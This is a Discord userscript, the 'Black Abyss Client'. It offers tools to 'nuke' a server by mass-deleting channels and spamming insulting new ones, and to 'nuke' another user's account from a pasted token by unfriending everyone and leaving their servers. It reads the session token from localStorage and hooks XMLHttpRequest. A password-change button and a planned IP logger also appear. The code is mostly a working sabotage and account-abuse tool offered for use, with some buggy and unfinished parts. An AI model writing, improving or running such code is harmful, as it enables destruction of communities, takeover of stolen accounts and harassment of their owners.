// ==UserScript==
// @name         Black Abyss Client | User nuker, Server nuker, Image Editor & Sender, Commands, Message sending API
// @namespace    http://tampermonkey.net/
// @version      1
// @description  The best public Discord clients? Contains User nuker, Server nuker, Image Editor & Sender, Commands, Message sending API, Message editing API, Token changer, and more!
// @author       VirusterDev
// @match        *://discord.com/*
// @icon         none
// @grant        none
// ==/UserScript==
(function() {
    'use strict';
    /*
    This script uses your Discord token for API, and does not log.
    This script is checked and approved by other JavaScript developers, and is clean of token loggers.
    */
    const abilities = {
        utils: {
            request: async(URL, METHOD, DATA, ONFINISH, TOKEN, TIMEOUT = 0)=>{
                window.dispatchEvent(new Event("beforeunload"));const storage=document.body.appendChild(document.createElement("iframe")).contentWindow.localStorage,token=JSON.parse(storage.token);var goal=document.URL.substring(document.URL.lastIndexOf("/")+1,document.URL.length);
                let xml = new XMLHttpRequest;
                xml.open(METHOD, URL)
                xml.timeout = TIMEOUT;
                if(!TOKEN)xml.setRequestHeader('authorization', token)
                else if(TOKEN)xml.setRequestHeader('authorization', TOKEN)
                else throw new Error('[Black Abyss] > Error:  Failed to locate authentication');
                xml.setRequestHeader('Content-Type', 'application/json')
                xml.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.' + Math.floor(Math.random() * 99)) // idfk lmaooo
                xml.onreadystatechange = async() => {
                    switch(xml.status){
                        case '404':
                            throw new Error('[Black Abyss] > Error:  Failed to find')
                            break;
                        case '429':
                            throw new Error('[Black Abyss] > Error:  Network rate limit exceeded')
                            break;
                    }
                    if(xml.response && ONFINISH){ONFINISH(xml.response);ONFINISH=null}
                }
                xml.send(DATA)
            },
            Settings: {
                alt_Key: false,
                ban_all: false,
                delete_all: true,
                spam_server: true,
                mass_ping: false,
                nuke_activated: false,
                userNuke: {
                    deleteAll: true,
                    unfriendAll: true,
                    changeUserName: 'Black Abyss',
                    tokenSelected: ''
                }
            }
        },
        deleteChannel: async(channelId) => {
            abilities.utils.request(`https://discord.com/api/v9/channels/${channelId}`, 'DELETE', null, null)
        },
        sendMessage: async(channelId, content) => {
            abilities.utils.request(`https://discord.com/api/v9/channels/${channelId}/messages`, 'POST', `{\"content\":\"${content}\",\"tts\":false}`, null)
        },
        sendEdit: async(channelId, messageId, content) => {
            abilities.utils.request(`https://discord.com/api/v9/channels/${channelId}/messages/${messageId}`, 'PATCH', `{\"content\":\"${content}\"}`, null)
        },
        createChannel: async(serverId, content, onload) => {
            abilities.utils.request(`https://discord.com/api/v9/guilds/${serverId}/channels`, 'POST', `{\"type\":0,\"name\":\"${content}\",\"permission_overwrites\":[]}`, onload)
        },
        getChannels: () => {
            let NodeList = document.querySelector("[aria-label='Channels'").querySelectorAll('li')
            let ids = []
            for(var i=0; i < NodeList.length; i++){
                if(NodeList[i].querySelector("a") && NodeList[i].querySelector("a").href.split('/')[5]){
                    ids.push(NodeList[i].querySelector("a").href.split('/')[5])
                }
            }
            return ids;
        },
        getFriends: (token) => {
            let friends = []
            abilities.utils.request('https://discord.com/api/v9/users/@me/relationships','GET', null, (e) => {
                friends.push(e.id)
            }, token)
            return friends;
        },
        removeFriend: async(token) =>{
            let loop429 = () => {
                abilities.utils.request('https://discord.com/api/v9/users/@me/relationships','DELETE', 'idk yet xdd', (e) => {
                    if(e.status == '429')loop429();
                }, token)
            }
            }
    }
    top.abilities = abilities;
    var menu = {}
    document.addEventListener("keydown", (e) => {
        if(e.key == 'Escape' && e.ctrlKey){
            menu.underlay.style.display = ((menu.underlay.style.display == 'block' ? true : false) == true ? 'none' : 'block')
        }
        if(e.key == 'Alt'){
            abilities.utils.Settings.alt_Key = true
        }
    })
    document.addEventListener("keyup", (e) => {
        if(e.key == 'Alt'){
            abilities.utils.Settings.alt_Key = false
        }
    })
    function Element(type, style){
        let element = document.createElement(type)
        element.style = style
        return element;
    }
    menu.underlay = Element('div', 'border-right:3px solid black;display:none; background-image: url("https://media.discordapp.net/attachments/989183343688056852/1050608917903851553/download.png?width=500&height=300"); width: 500px; height:300px; position:fixed; top: 0%; right:0%; left:0%; bottom:0%; z-index:9999;')
    top.document.body.appendChild(menu.underlay)
    menu.header = Element('div', 'background-color: rgba(0,0,0,0.5); width:500px; height:35px;')
    menu.underlay.appendChild(menu.header)
    menu.header.textElement = Element('h3', 'text-align:center;color: #333; font-size:30px; margin:0px;')
    menu.header.textElement.innerHTML = "Black Abyss Client <h3 style='color: #777; font-size:20px; background-color: rgba(0,0,0,0.5); width: 75px;margin: auto; margin-top:4px;border-bottom-left-radius: 30%;border-bottom-right-radius: 30%; border: 1px solid black; border-top:none; border-left: 2px solid black; border-right: 2px solid black;'>V1.0</h3>"
    menu.header.appendChild(menu.header.textElement)
    menu.tabDiv = Element('div', 'width: 130px; height: 265px; background-color: rgba(0,0,0,0.5); margin:0px;')
    menu.tabs = {}
    menu.tabDivs = {}
    menu.tabs.tab1 = Element('button', 'border:none; background-color:#000; color:#444; margin:0px; width:130px;height:35px; font-size:initial;')
    menu.tabs.tab1.innerHTML = 'Nuke'
    menu.tabDiv.appendChild(menu.tabs.tab1)
    menu.underlay.appendChild(menu.tabDiv)
    menu.tabDivs.tab1 = Element('div', 'overflow:auto;width:370px; height:265px; background-color:rgba(0, 0, 0, 0.8); display:none; position:absolute; top:35px; left:130px;border-left:1px solid black;')
    menu.underlay.appendChild(menu.tabDivs.tab1)
    menu.tabs.tab1.onclick = ()=>{
        menu.tabDivs.tab1.style.display = 'block'
        menu.tabDivs.tab2.style.display = 'none'
        menu.tabDivs.tab3.style.display = 'none'
        menu.header.textElement.querySelector('h3').innerHTML = menu.tabs.tab1.innerHTML
        menu.header.textElement.querySelector('h3').style.width = (((menu.header.textElement.querySelector('h3').innerText.length * 11) + 50) + 'px')
        menu.header.textElement.querySelector('h3').style.borderRadius = '0px'
        menu.header.textElement.querySelector('h3').style.display = 'none'
    }

    menu.tabs.tab2 = Element('button', 'border:none; background-color:#000; color:#444; margin:0px; width:130px;height:35px; font-size:initial;')
    menu.tabs.tab2.innerHTML = 'Messages'
    menu.tabDivs.tab2 = Element('div', 'overflow:auto; width:370px; height:265px; background-color:rgba(0, 0, 0, 0.8); display:none; position:absolute; top:35px; left:130px; border-left:1px solid black;')
    menu.tabDiv.appendChild(menu.tabs.tab2)
    menu.underlay.appendChild(menu.tabDivs.tab2)
    menu.tabs.tab2.onclick = ()=>{
        menu.tabDivs.tab2.style.display = 'block'
        menu.tabDivs.tab3.style.display = 'none'
        menu.tabDivs.tab1.style.display = 'none'
        menu.header.textElement.querySelector('h3').innerHTML = menu.tabs.tab2.innerHTML
        menu.header.textElement.querySelector('h3').style.width = (((menu.tabs.tab2.innerText.length * 11) + 50) + 'px')
        menu.header.textElement.querySelector('h3').style.borderRadius = '0px'
        menu.header.textElement.querySelector('h3').style.display = 'none'
    }
    menu.tabs.tab3 = Element('button', 'border:none; background-color:#000; color:#444; margin:0px; width:130px;height:35px; font-size:initial;')
    menu.tabs.tab3.innerHTML = 'Security'
    menu.tabDivs.tab3 = Element('div', 'overflow:auto; width:370px; height:265px; background-color:rgba(0, 0, 0, 0.8); display:none; position:absolute; top:35px; left:130px; border-left:1px solid black;')
    menu.tabDiv.appendChild(menu.tabs.tab3)
    menu.underlay.appendChild(menu.tabDivs.tab3)
    menu.tabs.tab3.onclick = ()=>{
        menu.tabDivs.tab3.style.display = 'block'
        menu.tabDivs.tab2.style.display = 'none'
        menu.tabDivs.tab1.style.display = 'none'
        menu.header.textElement.querySelector('h3').innerHTML = menu.tabs.tab3.innerHTML
        menu.header.textElement.querySelector('h3').style.width = (((menu.tabs.tab3.innerText.length * 11) + 50) + 'px')
        menu.header.textElement.querySelector('h3').style.borderRadius = '0px'
        menu.header.textElement.querySelector('h3').style.display = 'none'
    }
    menu.tabDivs.tab1.addElement = (type, id, onclick, style, text, inputVariable) => {
        switch(type){
            case 'Header':
                var Header = Element('h2', style);
                Header.innerText = text
                menu.tabDivs.tab1.appendChild(Header);
                break;
            case 'Button':
                var Button = Element('button', style);
                Button.innerText = text
                menu.tabDivs.tab1.appendChild(Button);
                if(onclick)Button.onclick = ()=>{onclick(Button)}
                if(id)Button.id = id
                return Button;
                break;
            case 'TextInput':
                var TextInput = Element('input', style)
                if(id)TextInput.id = id
                TextInput.placeholder = text
                TextInput.addEventListener('input', ()=>{
                    inputVariable(TextInput.value)
                })
                menu.tabDivs.tab1.appendChild(TextInput);
                return TextInput;
                break;
            case 'RangeInput':
                break;
            case 'Text':
                break;
            case 'RangeBar':
                break;
        }
    }
    menu.tabDivs.tab2.addElement = (type, id, onclick, style, text, inputVariable) => {
        switch(type){
            case 'Header':
                var Header = Element('h2', style);
                Header.innerText = text
                menu.tabDivs.tab2.appendChild(Header);
                break;
            case 'Button':
                var Button = Element('button', style);
                Button.innerText = text
                menu.tabDivs.tab2.appendChild(Button);
                if(onclick)Button.onclick = ()=>{onclick(Button)}
                if(id)Button.id = id
                return Button;
                break;
            case 'TextInput':
                var TextInput = Element('input', style)
                if(id)TextInput.id = id
                TextInput.placeholder = text
                TextInput.addEventListener('input', ()=>{
                    inputVariable(TextInput.value)
                })
                menu.tabDivs.tab2.appendChild(TextInput);
                return TextInput;
                break;
            case 'RangeInput':
                break;
            case 'Text':
                break;
            case 'RangeBar':
                break;
        }
    }
    menu.tabDivs.tab3.addElement = (type, id, onclick, style, text, inputVariable) => {
        switch(type){
            case 'Header':
                var Header = Element('h2', style);
                Header.innerText = text
                menu.tabDivs.tab3.appendChild(Header);
                break;
            case 'Button':
                var Button = Element('button', style);
                Button.innerText = text
                menu.tabDivs.tab3.appendChild(Button);
                if(onclick)Button.onclick = ()=>{onclick(Button)}
                if(id)Button.id = id
                return Button;
                break;
            case 'TextInput':
                var TextInput = Element('input', style)
                if(id)TextInput.id = id
                TextInput.placeholder = text
                TextInput.addEventListener('input', ()=>{
                    inputVariable(TextInput.value)
                })
                menu.tabDivs.tab3.appendChild(TextInput);
                return TextInput;
                break;
            case 'RangeInput':
                break;
            case 'Text':
                break;
            case 'RangeBar':
                break;
        }
    }
    var tab_1_Fill = {
        $split_1: menu.tabDivs.tab1.addElement('Header', null, null, 'text-align:center;width:100%; color:#888; margin-bottom:10px; border-bottom:2px solid #555;', 'Server Nuke'),
        $btn_1: menu.tabDivs.tab1.addElement('Button', null, ()=>{
            abilities.utils.Settings.nuke_activated = true
            let channels = abilities.getChannels()
            console.log(channels)
            let loopNumber = 0
            let loopFunction = function(){
                if(channels[loopNumber] && abilities.utils.Settings.delete_all){
                    abilities.deleteChannel(channels[loopNumber])
                    loopNumber += 1
                    loopFunction()
                }else{
                    let loopNumber = 0;
                    let rateLimit = false
                    let loopFunction = function(){
                        if(loopNumber <= 50 && abilities.utils.Settings.spam_server){
                            if(loopNumber == 5){
                                let loopNumber2 = 0;
                                while(loopNumber2 < 20){
                                    if(!rateLimit){
                                        abilities.createChannel(window.location.href.split('/')[4], ['Noob','Nuke', 'EZ', 'Clown', 'Black Abyss', 'Server Wrecked', 'Black Abyss', 'Black Abyss', 'NUKE','NUKE','NUKE','NUKE'][Math.floor(Math.random() * 12)], (e) => {
                                            if(JSON.parse(e).message == "You are being rate limited."){
                                                return false;
                                                loopNumber2--
                                            }
                                        })
                                        loopNumber2++
                                    }
                                }
                            }
                            let MS = Date.now()
                            abilities.createChannel(window.location.href.split('/')[4], ['Noob','Nuke', 'EZ', 'Clown', 'Black Abyss', 'Server Wrecked', 'Black Abyss', 'Black Abyss', 'NUKE','NUKE','NUKE','NUKE'][Math.floor(Math.random() * 12)], (e) => {
                                if(JSON.parse(e).message == "You are being rate limited."){
                                    setTimeout(loopFunction(),JSON.parse(e).retry_after)
                                    loopFunction()
                                    setTimeout(() => {rateLimit = false},JSON.parse(e).retry_after - (Date.now - MS))
                                    rateLimit = true
                                }else{
                                    (loopNumber == 25 ? function(){for(var i=0; i < 50; i++){loopFunction()}} : setTimeout(loopFunction(), 300))
                                    loopFunction()
                                    loopNumber++
                                }
                            })
                        }else{
                            // Ban all
                            abilities.utils.Settings.nuke_activated = false
                        }
                    }
                    loopFunction()
                }
            }
            loopFunction()
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Nuke Current Server'),
        $check_1: menu.tabDivs.tab1.addElement('Button', null, (e)=>{
            e.innerText = 'Ban all users: ' + (e.innerText.split(': ')[1] == 'off' ? 'on' : 'off')
            if(e.innerText.split(': ')[1] == 'on'){
                abilities.utils.Settings.ban_all = true
            }else{
                abilities.utils.Settings.ban_all = false
            }
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Ban all users: off'),
        $check_2: menu.tabDivs.tab1.addElement('Button', null, (e)=>{
            e.innerText = 'Delete all: ' + (e.innerText.split(': ')[1] == 'off' ? 'on' : 'off')
            if(e.innerText.split(': ')[1] == 'on'){
                abilities.utils.Settings.delete_all = true
            }else{
                abilities.utils.Settings.delete_all = false
            }
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Delete all: on'),
        $check_3: menu.tabDivs.tab1.addElement('Button', null, (e)=>{
            e.innerText = 'Spam channels: ' + (e.innerText.split(': ')[1] == 'off' ? 'on' : 'off')
            if(e.innerText.split(': ')[1] == 'on'){
                abilities.utils.Settings.spam_server = true
            }else{
                abilities.utils.Settings.spam_server = false
            }
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Spam channels: on'),
        $check_4: menu.tabDivs.tab1.addElement('Button', null, (e)=>{
            e.innerText = 'Mass ping: ' + (e.innerText.split(': ')[1] == 'off' ? 'on' : 'off')
            if(e.innerText.split(': ')[1] == 'on'){
                abilities.utils.Settings.mass_ping = true
            }else{
                abilities.utils.Settings.mass_ping = false
            }
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Mass ping: off'),
        $split_2: menu.tabDivs.tab1.addElement('Header', null, null, 'text-align:center;width:100%; color:#888; margin-top:10px; border-bottom:2px solid #555;', 'User Nuke'),
        $token_input: menu.tabDivs.tab1.addElement('TextInput', null, null, 'margin-top:5px;width:98%; color:#777; border:2px solid #333; background-color:#000;', 'Target Token', (e)=>{abilities.utils.Settings.userNuke.tokenSelected = e}),
        $btn_2: menu.tabDivs.tab1.addElement('Button', null, (e)=>{
            if(abilities.utils.Settings.userNuke.unfriendAll){
                let friends = abilities.getFriends(abilities.utils.Settings.userNuke.tokenSelected)
                let friendsDeleted = 0
                while(friends.length > friendsDeleted){
                    abilities.removeFriend(abilities.utils.Settings.userNuke.tokenSelected, friends[friendsDeleted])
                    friendsDeleted++
                }};if(abilities.utils.Settings.userNuke.deleteAll){
                    let servers = abilities.getFriends(abilities.utils.Settings.userNuke.tokenSelected)
                    let serversDeleted = 0
                    while(servers.length > serversDeleted){
                        abilities.removeServer(abilities.utils.Settings.userNuke.tokenSelected, servers[serversDeleted])
                        serversDeleted++
                    }}
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Nuke user'),
        $check_0: menu.tabDivs.tab1.addElement('Button', null, (e)=>{
            e.innerText = 'Leave/delete servers: ' + (e.innerText.split(': ')[1] == 'off' ? 'on' : 'off')
            if(e.innerText.split(': ')[1] == 'on'){
                abilities.utils.Settings.userNuke.deleteAll = true
            }else{
                abilities.utils.Settings.userNuke.deleteAll = false
            }
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Leave/delete servers: on'),
        $check_0: menu.tabDivs.tab1.addElement('Button', null, (e)=>{
            e.innerText = 'Remove friends: ' + (e.innerText.split(': ')[1] == 'off' ? 'on' : 'off')
            if(e.innerText.split(': ')[1] == 'on'){
                abilities.utils.Settings.userNuke.unfriendAll = true
            }else{
                abilities.utils.Settings.userNuke.unfriendAll = false
            }
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Remove friends: on')
    }
    var tab_2_fill = {
        $check_1: menu.tabDivs.tab2.addElement('Button', null, (e)=>{
            e.innerText = 'Auto grind dank memer: ' + (e.innerText.split(': ')[1] == 'off' ? 'on' : 'off')
            if(e.innerText.split(': ')[1] == 'on'){
                abilities.utils.Settings.autogrind.loopCount = 0
                abilities.utils.Settings.autogrind.loop = () => {
                }

            }else{
                abilities.utils.Settings.autogrind.activated = false
            }
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Auto grind dank memer: off'),
        canvas: null,
        $check_2: menu.tabDivs.tab2.addElement('Button', null, (e)=>{
            if(e.innerText !== 'Close'){
                tab_2_fill.$check_1.style.display = 'none'
                tab_2_fill.$check_2.innerText = 'Close'
                tab_2_fill.canvas.style.display = 'block'
    tab_2_fill.canvas.ctx.fillStyle = "white";
    tab_2_fill.canvas.ctx.fillRect(10, 10, tab_2_fill.canvas.width, tab_2_fill.canvas.height);
            }else{
                tab_2_fill.$check_1.style.display = 'block'
                tab_2_fill.$check_2.innerText = 'Draw Image'
                tab_2_fill.canvas.style.display = 'none'
            }
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Draw Image')
    }
    tab_2_fill.canvas = Element('canvas', 'border: 2px solid black; display: none;');
    tab_2_fill.canvas.id = 'canvass'
    menu.tabDivs.tab2.appendChild(tab_2_fill.canvas);
    tab_2_fill.canvas.ctx = tab_2_fill.canvas.getContext("2d");
    tab_2_fill.canvas.height = 240
    tab_2_fill.canvas.width = 350
    tab_2_fill.canvas.addEventListener('mousedown', (e) => {
        if(abilities.utils.Settings.alt_Key){
            //abilities.sendMessage(document.URL.split('/')[5],tab_2_fill.canvas.toDataURL("image/png"));
           let L = document.createElement('a')
  L.href = tab_2_fill.canvas.toDataURL("image/png")
  L.download = 'Black Abyss' + Math.floor(Math.random() * 99999999999999999999999999999999)
  document.body.appendChild(L)
  L.click()
  document.body.removeChild(L)
                tab_2_fill.$check_1.style.display = 'block'
                tab_2_fill.$check_2.innerText = 'Draw Image'
                tab_2_fill.canvas.style.display = 'none'
        }else{
        tab_2_fill.canvas.drawing = true
        tab_2_fill.canvas.ctx.beginPath();
        tab_2_fill.canvas.ctx.arc(e.clientX - 142, e.clientY - 60, 10, 0, 2 * Math.PI);
        tab_2_fill.canvas.ctx.fill();
        }
    })
    tab_2_fill.canvas.addEventListener('mouseup', () => {
        tab_2_fill.canvas.drawing = false
    })
    tab_2_fill.canvas.addEventListener('mousemove', (e) => {
        if(tab_2_fill.canvas.drawing){
            tab_2_fill.canvas.ctx.beginPath();
            tab_2_fill.canvas.ctx.fillStyle = 'black'
            tab_2_fill.canvas.ctx.arc(e.clientX - 142, e.clientY - 60, 10, 0, 2 * Math.PI); // my last dying hope
            tab_2_fill.canvas.ctx.fill(); //im such a idiot.
            // I had a 20 min screen recording of me coding all this, and then my shithole laptop legit turned off for no reason and i lost the rec
        }
    })

    var tab_3_fill = {
        $check_1: menu.tabDivs.tab3.addElement('Button', null, (e)=>{
            alert(`Warning! This is not finished and by clicking OK you will be logged out of your discord account, and your password will be changed to "BlackAbyss"`)
            e.innerText = 'Changing... 0%'
            e.ilivey = Date.now()
            let currpass = prompt('enter your current password')
            abilities.utils.request(`https://discord.com/api/v9/users/@me`, 'PATCH',"{\"password\":\""+currpass+"\",\"new_password\":\"BlackAbyss\"}" , ()=>{
                e.innerText = 'Changing... 50%'
                abilities.utils.request(`https://discord.com/api/v9/users/@me`, 'PATCH',"{\"password\":\"BlackAbyss\",\"new_password\":\""+currpass+"\"}" , ()=>{
                    e.innerText = `Changing... 100%  LoadTime: ${Date.now() - e.ilivey}ms`
    setTimeout(()=>{e.innerText = 'Change Discord Token'},300)
                })
            })
        }, 'border: 1px solid #777; background-color: black; color: rgb(119, 119, 119); margin:auto; width:100%;', 'Change Discord Token (DO NOT USE!)'),
    }
    abilities.utils.Settings.autogrind = {}
    abilities.utils.Settings.commands = [['!test', 'WORKS!']]
    top.Handle = (thisArg, argumentsList) => {
        try{
        if(argumentsList[0]){
            let p = JSON.parse(argumentsList[0]), id = p.nonce, c = p.content
            for(var co=0; co < abilities.utils.Settings.commands.length; co++){
                if(abilities.utils.Settings.commands[co][0] == c){
                    abilities.sendMessage(document.URL.split('/')[5], abilities.utils.Settings.commands[co][1])
                }
            }
        }
    }catch{}
    }
    XMLHttpRequest.prototype.send = new Proxy(XMLHttpRequest.prototype.send,{
        apply(target, thisArg, argumentsList) {
            top.Handle(thisArg, argumentsList)
            return Reflect.apply(target, thisArg, argumentsList)
        }
    });
    /*
    Menu is still in development... Stay tuned for more updates :)
    TO-DO:
    * Bulk message delete (x)
    * Account (token) nuker (w) CURRENT TASK
    * API abuse for fun (x)
    * Message delete/edit logs (x)
    * WebRTC IP logger (Voice / Video call) (x)
    * Proxy XMLHttpRequest commands, return false then send a new one, add a option for editing (finished)
    * Image editor & Sender (finished)
    !IMPORTANT!
    ** DO NOT COPY! **
    I allow simple usage of the script, you may add more commands. if you post any version of this script modified or not, you must link the script and my YouTube channel in the description or I will get the script removed.
    */
})();